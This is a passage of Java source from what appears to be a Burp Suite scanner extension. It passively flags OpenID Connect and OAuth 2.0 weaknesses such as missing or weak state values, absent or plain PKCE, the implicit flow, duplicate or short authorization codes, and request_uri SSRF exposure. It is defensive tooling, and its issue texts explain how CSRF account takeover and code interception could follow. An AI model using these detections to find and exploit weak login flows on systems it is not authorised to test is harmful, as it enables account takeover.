                                                    +"If this request does not have any other anti-CSRF protection then an attacker could manipulate "
                                                    +"the OpeniD Flow and obtain access to other user accounts.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
                                            "Medium",
                                            "Firm"
                                    )
                            );
                        } else {
                            String stateValue = stateParameter.getValue();
                            if (responseString.toLowerCase().contains(stateValue.toLowerCase())) {
                                // Checking for OpenID Authorization Code Flow with Duplicate State value issues (potential constant state values)
//                                if (! GOTSTATES.isEmpty()) {
//                                    String respDate = getHttpHeaderValueFromList(respHeaders, "Date");
//                                    if (getHttpHeaderValueFromList(respHeaders, "Date") == null) {
//                                        // This is needed to avoid null values on respDate
//                                        respDate = Long.toString(currentTimeStampMillis);
//                                    }
//                                    // Start searching if last issued authorization code is a duplicated of already received codes
//                                    for (Map.Entry<String,List<String>> entry : GOTSTATES.entrySet()) {
//                                        List<String> stateList = entry.getValue();
//                                        String stateDate = entry.getKey();
//                                        for (String stateVal: stateList) {
//                                            if (responseString.toLowerCase().contains(stateVal.toLowerCase()) & (! stateDate.equals(respDate))) {
//                                                // This Authorization Code Flow response contains an already released State
//                                                List<int[]> matches = getMatches(responseString.getBytes(), stateVal.getBytes());
//                                                issues.add(
//                                                        new CustomScanIssue(
//                                                                baseRequestResponse.getHttpService(),
//                                                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
//                                                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, matches) },
//                                                                "[Flaw 2] OpenID Authorization Code Flow Duplicate State Parameter Detected",
//                                                                "The OpenID Authorization Server seems issuing duplicate values for the <code>state</code> parameter, "
//                                                                        +"during the login procedure.\n<br>"
//                                                                        +"In details, the authorization response contains the following <code>state</code> value <b>"+stateVal+"</b> which was already released.\n<br>"
//                                                                        +"Based on OpenID specifications the use of a unpredictable and unique (per user's session) "
//                                                                        +"<code>state</code> parameter, (generated from some private information about the user), "
//                                                                        +"provides a protection against CSRF attacks (as a sort of anti-CSRF token) during login procedure.\n<br>"
//                                                                        +"Using constant values for the <code>state</code> parameter de-facto disables its anti-CSRF protection.\n<br>"
//                                                                        +"If the authorization request does not have any other anti-CSRF protection then an attacker could manipulate "
//                                                                        +"the OpeniD Flow and obtain access to other user accounts.\n<br>"
//                                                                        +"Note: this issue should be <b>confirmed manually</b> by searching the duplicated <code>state</code> parameter values "
//                                                                        +"in the burp-proxy history.\n<br>"
//                                                                        +"<br>References:<br>"
//                                                                        +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
//                                                                "Medium",
//                                                                "Tentative"
//                                                        )
//                                                );
//                                            }
//                                        }
//                                    }
//                                }

                                // Retrieving 'state' values from OpenID Authorization Code Flow responses body or Location header
                                if (!respBody.isEmpty() || respInfo.getStatusCode()==302) {
                                    // Enumerate OpenID authorization states returned by HTTP responses
                                    String dateState = getHttpHeaderValueFromList(respHeaders, "Date");
                                    if (getHttpHeaderValueFromList(respHeaders, "Date")==null) {
                                        // This is needed to avoid null values on GOTSTATES
                                        dateState = Long.toString(currentTimeStampMillis);
                                    }
                                    List<String> foundStates = new ArrayList<>();
                                    // Check if already got state in same response (filtering by date)
                                    if (! GOTSTATES.containsKey(dateState)) {
                                        foundStates.addAll(getMatchingParams("state", "state", respBody, getHttpHeaderValueFromList(respHeaders, "Content-Type")));
                                        foundStates.addAll(getMatchingParams("state", "state", getHttpHeaderValueFromList(respHeaders, "Location"), "header"));
                                        foundStates.addAll(getMatchingParams("state", "state", respBody, "link"));
                                        // Remove duplicate states found in same request
                                        foundStates = new ArrayList<>(new HashSet<>(foundStates));
                                        if (!foundStates.isEmpty()) {
                                            GOTSTATES.put(dateState, foundStates);
                                        }
                                    }
                                } else {
                                    // The response does not return the same state parameter received within the authorization request
                                    List<int[]> reqMatches = getMatches(requestString.getBytes(), stateValue.getBytes());
                                    List<int[]> respMatches = getMatches(responseString.getBytes(), stateValue.getBytes());
                                    if (respMatches.isEmpty()) {
                                        issues.add(
                                                new CustomScanIssue(
                                                        baseRequestResponse.getHttpService(),
                                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, reqMatches, null) },
                                                        "[Flaw 8] OpenID Authorization Code Flow State Parameter Mismatch Detected",
                                                        "The Authorization Server does not send in response the same <code>state</code> parameter "
                                                                +"received in the authorization request during the OpenID login procedure.\n<br>"
                                                                +"In details, the response does not contains the same <code>state</code> value <b>"+stateValue+"</b> sent within the authorization request\n<br>"
                                                                +"Based on OpenID specifications the use of a unpredictable and unique (per user's session) "
                                                                +"<code>state</code> parameter, (generated from some private information about the user), "
                                                                +"provides a protection against CSRF attacks (as a sort of anti-CSRF token) during login procedure.\n<br>"
                                                                +"Then for security reasons this mechanism requires that when the Authorization Server receives a <code>state</code> parameter "
                                                                +"its response must contain the same <code>state</code> value, then this misconfiguration disables its anti-CSRF protection.\n<br>"
                                                                +"If the authorization request does not have any other anti-CSRF protection then an attacker could manipulate "
                                                                +"the OpeniD Flow and obtain access to other user accounts.\n<br>"
                                                                +"<br>References:<br>"
                                                                +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html\">https://openid.net/specs/openid-connect-core-1_0.html</a>",
                                                        "Medium",
                                                        "Firm"
                                                )
                                        );
                                    }
                                }
                            }
                        }

                        // Checking for OpenID Authorization Code Flow misconfiguration (missing nonce)
/*
去掉
1. 官方文档https://openid.net/specs/openid-connect-core-1_0.html
2. 里面提到nonce参数是分情况的，如果是implicit等是required，如果是code授权码模式是optional
3. 但是目前来看，授权码模式不需要使用nonce，implicit和hybrid情况在19，27行已经处理过了
 */
//                        if (nonceParameter==null) {
//                            issues.add(
//                                    new CustomScanIssue(
//                                            baseRequestResponse.getHttpService(),
//                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
//                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
//                                            "[Flaw 2] OpenID Authorization Code Flow without Nonce Parameter",
//                                            "The OpenID Authorization Code Flow is improperly implemented because the mandatory <code>nonce</code> is missing.\n<br>"
//                                                    +"Based on OpenID specification this parameter should be unguessable and unique per "
//                                                    +"client session in order to provide a security mitigation against replay attacks.\n<br>"
//                                                    +"If there are not in place other anti-replay protections, then an attacker able to retrieve "
//                                                    +"a valid authorization request could replay it and potentially obtain access to other user resources.\n<br>"
//                                                    +"<br>References:<br>"
//                                                    +"<a href=\"https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes\">https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes</a>",
//                                            "Low",
//                                            "Firm"
//                                    )
//                            );
//                        }

                        // Checking for OpenID Authorization Code Flow without PKCE protection
                        if (challengeParameter == null) {
                        //if ((!reqQueryParam.containsKey("code_challenge")) || (challengeParameter == null)) {
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                            "[Flaw 5] OpenID Authorization Code Flow without PKCE Protection Detected",
                                            "The Authorization Code Flow login request does not have the <code>code_challenge</code> parameter, "
                                                    +"then there is not any PKCE protections against authorization code interception.\n<br>"
                                                    +"In Mobile, Native desktop and SPA contexts (public clients) is a security requirement to use OpenID Authorization Code Flow with PKCE extension "
                                                    +"or alternatively to use OpenID Hybrid Flow.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://openid.net/specs/openid-igov-oauth2-1_0-02.html#rfc.section.3.1.7\">https://openid.net/specs/openid-igov-oauth2-1_0-02.html#rfc.section.3.1.7</a>",
                                            "Medium",
                                            "Firm"
                                    )
                            );
                            // Checking for OpenID Authorization Code Flow PKCE misconfiguration
                        //} else if ((reqQueryParam.containsKey("code_challenge_method")) || (challengemethodParameter != null)) {
                        } else if (challengemethodParameter != null) {
                            if ("plain".equalsIgnoreCase(challengemethodParameter.getValue())) {
                                List<int[]> matches = getMatches(requestString.getBytes(), "plain".getBytes());
                                issues.add(
                                        new CustomScanIssue(
                                                baseRequestResponse.getHttpService(),
                                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, matches, null) },
                                                "[Flaw 5] OpenID Authorization Code Flow with PKCE Plaintext",
                                                "The Authorization Code Flow with PKCE is configured with the <code>code_challenge_method</code> parameter set to <b>plain</b>.\n<br>"
                                                        +"This means that the secret <code>code_verifier</code> value is sent plaintext as "
                                                        +"<code>code_challenge</code> parameter on authorization requests and "
                                                        +"then PKCE protections against authorization code interception attacks are de-facto disabled. In fact "
                                                        +"they are based on the secrecy of the <code>code_verifier</code> parameter sent within requests.\n<br>"
                                                        +"In Mobile, Native desktop and SPA contexts (public clients) is a security requirement to use OpenID Authorization Code Flow with PKCE extension "
                                                        +"or alternatively to use OpenID Hybrid Flow.\n<br>"
                                                        +"<br>References:<br>"
                                                        +"<a href=\"https://openid.net/specs/openid-igov-oauth2-1_0-02.html#rfc.section.3.1.7\">https://openid.net/specs/openid-igov-oauth2-1_0-02.html#rfc.section.3.1.7</a>",
                                                "Medium",
                                                "Firm"
                                        )
                                );
                            }
                        }
                    }
                }


                // Go here for passive checks for OAUTHv2 issues
            } else {
                // First search for OAUTHv2 Implicit or Authorization Code Flows
                if ( ((reqQueryParam!=null & reqQueryParam.containsKey("client_id") & reqQueryParam.containsKey("response_type")) ||
                        ( reqParam!=null & (clientidParameter != null) & (resptypeParameter!=null))) ) {
                    stdout.println("[+] Passive Scan: OAUTHv2 Implicit or Authorization Code Flows detected");
                    if (reqQueryParam.containsKey("redirect_uri") & reqQueryParam.containsKey("response_type")) {
                        respType = reqQueryParam.get("response_type");
                        redirUri = reqQueryParam.get("redirect_uri");
                    } else if ((redirParameter != null) & (resptypeParameter!=null)) {
                        respType = resptypeParameter.getValue();
                        redirUri = redirParameter.getValue();
                    }


                    // Check for weak OAUTHv2 state values (i.e. insufficient length, only alphabetic, only numeric, etc.)
                    if (stateParameter!=null) {
                        String stateValue = stateParameter.getValue();
                        if ( (stateValue.length() < 5) || ( (stateValue.length() < 7) & ((stateValue.matches("[a-zA-Z]+")) || (stateValue.matches("[0-9]+")))) ) {
                            List<int[]> requestHighlights = new ArrayList<>(1);
                            int[] stateOffset = new int[2];
                            int stateStart = requestString.indexOf(stateValue);
                            stateOffset[0] = stateStart;
                            stateOffset[1] = stateStart+stateValue.length();
                            requestHighlights.add(stateOffset);
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, requestHighlights, null) },
                                            "[Flaw 8] OAUTHv2 Flow with Weak State Parameter",
                                            "The OAUTHv2 Flow presents a security misconfiguration because is using weak values for"
                                                    +"the <code>state</code> parameter.\n<br> "
                                                    +"In details, the OAUTHv2 Flow request contains a <code>state</code> value of <b>"+stateValue+"</b>.\n<br>"
                                                    +"Based on OAUTHv2 specifications the use of a unpredictable and unique (per user's session) "
                                                    +"<code>state</code> parameter, (generated from some private information about the user), "
                                                    +"provides a protection against CSRF attacks (as a sort of anti-CSRF token) during login procedure.\n<br>"
                                                    +"When the <code>state</code> value is guessable (insufficient entropy) "
                                                    +"then the attack surface of the OAUTHv2 service increases.\n<br>"
                                                    +"If there are not in place other anti-CSRF protections then an attacker could potentially manipulate "
                                                    +"the OpeniD Flow and obtain access to other user accounts.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6819#page-13\">https://datatracker.ietf.org/doc/html/rfc6819#page-13</a>",
                                            "Low",
                                            "Firm"
                                    )
                            );
                        }
                    }


                    // Checking for OAUTHv2 Flow with 'request_uri' parameter
                    if (requesturiParameter!=null) {
                        String reqUriValue = requesturiParameter.getValue();
                        List<int[]> matches = getMatches(requestString.getBytes(), reqUriValue.getBytes());
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, matches, null) },
                                        "[Info] OAUTHv2 Flow with Request_Uri Parameter Detected",
                                        "The OAUTHv2 Flow uses the parameter <code>request_uri</code> set to <b>"+reqUriValue+"</b> in order to"
                                                +"enable the retrieving of client's Request-Object via a URI referencing to it.\n<br>"
                                                +"Based on OAUTHv2 specifications the value of the <code>request_uri</code> parameter "
                                                +"is set to an URI pointing to a server hosting a JWT which contains the client's parameter values. "
                                                +"In this way the OAUTHv2 Provider can fetch the provided URI and retrieve the Request-Object "
                                                +"by parsing the JWT contents.\n<br>"
                                                +"For security reasons the URI value of <code>request_uri</code> parameter should be carefully validated "
                                                +"at server-side, otherwise a threat agent could be able to lead the OAUTHv2 Provider to interact with "
                                                +"an arbitrary server under is control and then potentially exploit SSRF vulnerabilities.\n<br>"
                                                +"As mitigation the OAUTHv2 Provider should define a whitelist of allowed URI values (pre-registered "
                                                +"during the client registration process) for the <code>request_uri</code> parameter.\n<br>"
                                                +"<br>References:<br>"
                                                +"<a href=\"https://tools.ietf.org/html/draft-lodderstedt-oauth-par\">https://tools.ietf.org/html/draft-lodderstedt-oauth-par</a><br>"
                                                +"<a href=\"https://portswigger.net/research/hidden-oauth-attack-vectors\">https://portswigger.net/research/hidden-oauth-attack-vectors</a>",
                                        "Information",
                                        "Certain"
                                )
                        );
                    }


                    // Checking for OAUTHv2 Implicit Flow
                    if (respType.equals("token")) {
                        // Found the insecure OAUTHv2 Implicit Flow
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                        "OAUTHv2 Implicit Flow Insecure Implementation Detected",
                                        "This is a login request of OAUTHv2 Implicit Flow with a <code>response_type</code> value of <b>"+helpers.urlDecode(respType)+"</b>.<br>"
                                                +"The OAUTHv2 Implicit Flow is considered inherently insecure because allows the transmission of "
                                                +"secret tokens in the URL of HTTP GET requests (usually on URL fragment).\n<br>This behaviour is deprecated by OAUTHv2 specifications "
                                                +"since it exposes the secret tokens to leakages (i.e. via cache, traffic sniffing, accesses from Javascript, etc.) and replay attacks.\n<br>"
                                                +"It is suggested to adopt OAUTHv2 Authorization Code Flow with PKCE, or any of the OpenID Flow implementations considered secure by the stanard.\n<br>"
                                                +"The use of Implicit Flow is especially considered insecure in Mobile, Native desktop and SPA application contexts (public clients).\n<br>"
                                                +"<br>References:<br>"
                                                +"<a href=\"https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-09#page-5\">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-09#page-5</a><br>"
                                                +"<a href=\"https://tools.ietf.org/id/draft-parecki-oauth-browser-based-apps-02.txt\">https://tools.ietf.org/id/draft-parecki-oauth-browser-based-apps-02.txt</a>",
                                        "Medium",
                                        "Certain"
                                )
                        );


                        // Checking for Refresh token included in login response (Location header or body) that is discouraged for Implicit Flow
                        foundRefresh = false;
                        if (!respBody.isEmpty() && respBody.toLowerCase().contains("refresh")) {
                            foundRefresh = true;
                        } else if (getHttpHeaderValueFromList(respHeaders, "Location")!=null) {
                            if (getHttpHeaderValueFromList(respHeaders, "Location").toLowerCase().contains("refresh")) {
                                foundRefresh = true;
                            }
                        }
                        if (foundRefresh) {
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                            "OAUTHv2 Implicit Flow Improper Release of Refresh Token",
                                            "The Resource Server releases a refresh token after successful Implicit Flow login.\n<br>"
                                                    +"This behaviour is deprecated by OAUTHv2 specifications for Implicit Flow, also consider that "
                                                    +"the use of OAUTHv2 Implicit Flow is insecure and should be avoided.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6749#section-4.2\">https://datatracker.ietf.org/doc/html/rfc6749#section-4.2</a><br>"
                                                    +"<a href=\"https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-09#page-5\">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-09#page-5</a><br>"
                                                    +"<a href=\"https://tools.ietf.org/id/draft-parecki-oauth-browser-based-apps-02.txt\">https://tools.ietf.org/id/draft-parecki-oauth-browser-based-apps-02.txt</a>",
                                            "Medium",
                                            "Certain"
                                    )
                            );
                        }

                        // Checking for OAUTHv2 Authorization Code Flow
                    } else if (respType.equals("code")) {
                        // Found OAUTHv2 Authorization Code Flow
                        issues.add(
                                new CustomScanIssue(
                                        baseRequestResponse.getHttpService(),
                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                        "[Info] OAUTHv2 Authorization Code Flow Detected",
                                        "This is a login request of OAUTHv2 Authorization Code Flow, the <code>response_type</code> value is <b>"+helpers.urlDecode(respType)+"</b>.",
                                        "Information",
                                        "Certain"
                                )
                        );
                        // Checking for Duplicate Code value issues on OAUTHv2 Authorization Code Flow
                        if (! GOTCODES.isEmpty()) {
                            String respDate = getHttpHeaderValueFromList(respHeaders, "Date");
                            if (getHttpHeaderValueFromList(respHeaders, "Date") == null) {
                                // This is needed to avoid null values on respDate
                                respDate = Long.toString(currentTimeStampMillis);
                            }
                            // Start searching if last issued authorization code is a duplicated of already received codes
                            for (Map.Entry<String,List<String>> entry : GOTCODES.entrySet()) {
                                List<String> codeList = entry.getValue();
                                String codeDate = entry.getKey();
                                for (String codeValue : codeList) {
                                    if (responseString.toLowerCase().contains(codeValue.toLowerCase()) & (! codeDate.equals(respDate))) {
                                        // This Authorization Code Flow response contains an already released Code
                                        List<int[]> matches = getMatches(responseString.getBytes(), codeValue.getBytes());
                                        issues.add(
                                                new CustomScanIssue(
                                                        baseRequestResponse.getHttpService(),
                                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, matches) },
                                                        "OAUTHv2 Authorization Code Flow Duplicate Code Value Detected",
                                                        "The OAUTHv2 Authorization Server seems issuing duplicate values for <code>code</code> parameter "
                                                                +"during the login procedure.\n<br>"
                                                                +"In details, the authorization response contains the following <code>code</code> value <b>"+codeValue+"</b> which was already released.\n<br>"
                                                                +"For security reasons the OAUTHv2 specifications recommend that authorization code must be unique for each user's session.\n<br>"
                                                                +"Note: this issue should be <b>confirmed manually</b> by searching the duplicated authorization code "
                                                                +"values in the burp-proxy history.\n<br>"
                                                                +"<br>References:<br>"
                                                                +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.2\">https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.2</a>",
                                                        "Medium",
                                                        "Firm"
                                                )
                                        );
                                    }
                                }
                            }
                        }


                        // Retrieving codes from OAUTHv2 Authorization Code Flow responses body or Location header
                        if (!respBody.isEmpty() || respInfo.getStatusCode()==302) {
                            // Enumerate OAUTHv2 authorization codes returned by HTTP responses
                            String dateCode = getHttpHeaderValueFromList(respHeaders, "Date");
                            if (getHttpHeaderValueFromList(respHeaders, "Date")==null) {
                                // This is needed to avoid null values on GOTCODES
                                dateCode = Long.toString(currentTimeStampMillis);
                            }
                            List<String> foundCodes = new ArrayList<>();
                            for (String pName : SECRETCODES) {
                                // Check if already got code in same response (filtering by date)
                                if (! GOTCODES.containsKey(dateCode)) {
                                    foundCodes.addAll(getMatchingParams(pName, pName, respBody, getHttpHeaderValueFromList(respHeaders, "Content-Type")));
                                    foundCodes.addAll(getMatchingParams(pName, pName, getHttpHeaderValueFromList(respHeaders, "Location"), "header"));
                                    foundCodes.addAll(getMatchingParams(pName, pName, respBody, "link"));
                                    // Remove duplicate codes found in same response
                                    foundCodes = new ArrayList<>(new HashSet<>(foundCodes));
                                    if (!foundCodes.isEmpty()) {
                                        GOTCODES.put(dateCode, foundCodes);
                                        // Check for weak code issues (guessable values)
                                        for (String fCode : foundCodes) {
                                            if (fCode.length()<6) {
                                                // Found a weak code
                                                List<int[]> responseHighlights = new ArrayList<>(1);
                                                int[] tokenOffset = new int[2];
                                                int tokenStart = responseString.indexOf(fCode);
                                                tokenOffset[0] = tokenStart;
                                                tokenOffset[1] = tokenStart+fCode.length();
                                                responseHighlights.add(tokenOffset);
                                                issues.add(
                                                        new CustomScanIssue(
                                                                baseRequestResponse.getHttpService(),
                                                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, responseHighlights) },
                                                                "OAUTHv2 Weak Authorization Code Value Detected",
                                                                "The OAUTHv2 Authorization Code Flow presents a security misconfiguration, the Authorization Server releases weak <code>code</code> values "
                                                                        +"(insufficient entropy) during the login procedure.\n<br>"
                                                                        +"In details, the authorization response contains a <code>code</code> value of <b>"+fCode+"</b>.\n<br>"
                                                                        +"Based on OAUTHv2 specifications for security reasons the <code>code</code> must be unpredictable and unique "
                                                                        +"per client session.\n<br>Since the <code>code</code> value is guessable (insufficient entropy) "
                                                                        +"then the attack surface of the OAUTHv2 service increases.\n<br>"
                                                                        +"<br>References:<br>"
                                                                        +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6819#section-4.4.1.3\">https://datatracker.ietf.org/doc/html/rfc6819#section-4.4.1.3</a>",
                                                                "High",
                                                                "Firm"
                                                        )
                                                );
                                            }
                                        }
                                    }
                                }
                            }
                        }



                        // Checking for OAUTHv2 Authorization Code Flow without anti-CSRF protection
                        //if ( (!reqQueryParam.containsKey("state")) || (stateParameter == null)) {
                        if (stateParameter == null) {
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                            "[Flaw 8] OAUTHv2 Authorization Code Flow without State Parameter Detected",
                                            "The Authorization Code Flow login request does not have the <code>state</code> parameter.\n<br>"
                                                    +"Based on OAUTHv2 specifications the use of a unpredictable and unique (per user's session) <code>state</code> parameter value, "
                                                    +"provides a protection against CSRF attacks (as an anti-CSRF token) during Authorization Code Flow login procedure.\n<br>"
                                                    +"If the authorization request does not have any other anti-CSRF protection then an attacker could manipulate "
                                                    +"the OAUTHv2 Flow and obtain access to other user accounts.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6819#page-13\">https://datatracker.ietf.org/doc/html/rfc6819#page-13</a>",
                                            "Medium",
                                            "Firm"
                                    )
                            );
                        } else {
                            // Go here when OAUTHv2 Authorization Code request contains a 'state' parameter
                            String stateValue = stateParameter.getValue();
                            if (responseString.toLowerCase().contains(stateValue.toLowerCase())) {
                                // Checking for OAUTHv2 Authorization Code Flow with Duplicate State value issues (potential constant state values)
//                                if (! GOTSTATES.isEmpty()) {
//                                    String respDate = getHttpHeaderValueFromList(respHeaders, "Date");
//                                    if (getHttpHeaderValueFromList(respHeaders, "Date") == null) {
//                                        // This is needed to avoid null values on respDate
//                                        respDate = Long.toString(currentTimeStampMillis);
//                                    }
//                                    // Start searching if last issued authorization code is a duplicated of already received codes
//                                    for (Map.Entry<String,List<String>> entry : GOTSTATES.entrySet()) {
//                                        List<String> stateList = entry.getValue();
//                                        String stateDate = entry.getKey();
//                                        for (String stateVal: stateList) {
//                                            if (responseString.toLowerCase().contains(stateVal.toLowerCase()) & (! stateDate.equals(respDate))) {
//                                                // This Authorization Code Flow response contains an already released State
//                                                List<int[]> matches = getMatches(responseString.getBytes(), stateVal.getBytes());
//                                                issues.add(
//                                                        new CustomScanIssue(
//                                                                baseRequestResponse.getHttpService(),
//                                                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
//                                                                new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, matches) },
//                                                                "[Flaw 2] OAUTHv2 Authorization Code Flow Duplicate State Parameter Detected",
//                                                                "The OAUTHv2 Authorization Server seems issuing duplicate values for the <code>state</code> parameter "
//                                                                        +"during login procedure.\n<br>"
//                                                                        +"In details, the authorization response contains the following <code>state</code> value <b>"+stateVal+"</b> which was already released.\n<br>"
//                                                                        +"Based on OAUTHv2 specifications the use of a unpredictable and unique (per user's session) "
//                                                                        +"<code>state</code> parameter, (generated from some private information about the user), "
//                                                                        +"provides a protection against CSRF attacks (as a sort of anti-CSRF token) during login procedure.\n<br>"
//                                                                        +"Using constant values for the <code>state</code> parameter de-facto disables its anti-CSRF protection.\n"
//                                                                        +"If the authorization request does not have any other anti-CSRF protection then an attacker could manipulate "
//                                                                        +"the OAUTHv2 Flow and obtain access to other user accounts.\n<br>"
//                                                                        +"Note: this issue should be <b>confirmed manually</b> by searching the duplicated <code>state</code> parameter values "
//                                                                        +"in the burp-proxy history.\n<br>"
//                                                                        +"<br>References:<br>"
//                                                                        +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6819#page-13\">https://datatracker.ietf.org/doc/html/rfc6819#page-13</a>",
//                                                                "Medium",
//                                                                "Tentative"
//                                                        )
//                                                );
//                                            }
//                                        }
//                                    }
//                                }

                                // Retrieving 'state' values from OAUTHv2 Authorization Code Flow responses body or Location header
                                if (!respBody.isEmpty() || respInfo.getStatusCode()==302) {
                                    // Enumerate OAUTHv2 authorization states returned by HTTP responses
                                    String dateState = getHttpHeaderValueFromList(respHeaders, "Date");
                                    if (getHttpHeaderValueFromList(respHeaders, "Date")==null) {
                                        // This is needed to avoid null values on GOTSTATES
                                        dateState = Long.toString(currentTimeStampMillis);
                                    }
                                    List<String> foundStates = new ArrayList<>();
                                    // Check if already got state in same response (filtering by date)
                                    if (! GOTSTATES.containsKey(dateState)) {
                                        foundStates.addAll(getMatchingParams("state", "state", respBody, getHttpHeaderValueFromList(respHeaders, "Content-Type")));
                                        foundStates.addAll(getMatchingParams("state", "state", getHttpHeaderValueFromList(respHeaders, "Location"), "header"));
                                        foundStates.addAll(getMatchingParams("state", "state", respBody, "link"));
                                        // Remove duplicate states found in same response
                                        foundStates = new ArrayList<>(new HashSet<>(foundStates));
                                        if (!foundStates.isEmpty()) {
                                            GOTSTATES.put(dateState, foundStates);
                                        }
                                    }
                                } else {
                                    // The response does not return the same state parameter received within the authorization request
                                    List<int[]> reqMatches = getMatches(requestString.getBytes(), stateValue.getBytes());
                                    List<int[]> respMatches = getMatches(responseString.getBytes(), stateValue.getBytes());
                                    if (respMatches.isEmpty()) {
                                        issues.add(
                                                new CustomScanIssue(
                                                        baseRequestResponse.getHttpService(),
                                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                                        new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, reqMatches, null) },
                                                        "[Flaw 8] OAUTHv2 Authorization Code Flow State Parameter Mismatch Detected",
                                                        "The Authorization Server does not send in response the same <code>state</code> parameter "
                                                                +"received in the authorization request during the OAUTHv2 login procedure.\n<br>"
                                                                +"In details, the response does not contains the same <code>state</code> value <b>"+stateValue+"</b> sent within the authorization request\n<br>"
                                                                +"Based on OAUTHv2 specifications the use of a unpredictable and unique (per user's session) "
                                                                +"<code>state</code> parameter (generated from some private information about the user), "
                                                                +"provides a protection against CSRF attacks (as a sort of anti-CSRF token) during login procedure.\n<br>"
                                                                +"Then for security reasons this mechanism requires that when the Authorization Server receives a <code>state</code> parameter "
                                                                +"its response must contain the same <code>state</code> value, then this misconfiguration disables its anti-CSRF protection.\n<br>"
                                                                +"If the authorization request does not have any other anti-CSRF protection  then an attacker could manipulate "
                                                                +"the OAUTHv2 Flow and obtain access to other user accounts.\n<br>"
                                                                +"<br>References:<br>"
                                                                +"<a href=\"https://datatracker.ietf.org/doc/html/rfc6819#page-13\">https://datatracker.ietf.org/doc/html/rfc6819#page-13</a>",
                                                        "Medium",
                                                        "Firm"
                                                )
                                        );
                                    }
                                }
                            }
                        }



                        // Checking for OAUTHv2 Authorization Code Flow without PKCE protection
                        //if ((!reqQueryParam.containsKey("code_challenge")) || (challengeParameter == null)) {
                        if (challengeParameter == null) {
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            new IHttpRequestResponse[] { callbacks.applyMarkers(baseRequestResponse, null, null) },
                                            "[Flaw 5] OAUTHv2 Authorization Code Flow without PKCE Protection",
                                            "The Authorization Code Flow login request does not have the <code>code_challenge</code> parameter, "
                                                    +"then there is not any PKCE protection against authorization code interception.\n<br>"
                                                    +"The OAUTHv2 Authorization Code Flow with PKCE provides protection against authorization code interception attacks.\n"
                                                    +"In Mobile, Native desktop and SPA contexts (public clients) the use of OAUTHv2 Authorization Code Flow with PKCE extension is a security requirement.\n<br>"
                                                    +"<br>References:<br>"
                                                    +"<a href=\"https://datatracker.ietf.org/doc/html/rfc7636\">https://datatracker.ietf.org/doc/html/rfc7636</a>",
                                            "Medium",
                                            "Firm"
                                    )
                            );
                            // Checking for OAUTHv2 Authorization Code Flow with PKCE protection
                        //} else if ((reqQueryParam.containsKey("code_challenge")) || (challengeParameter != null)) {
                        } else if (challengemethodParameter != null) {
                            issues.add(
                                    new CustomScanIssue(
                                            baseRequestResponse.getHttpService(),
                                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
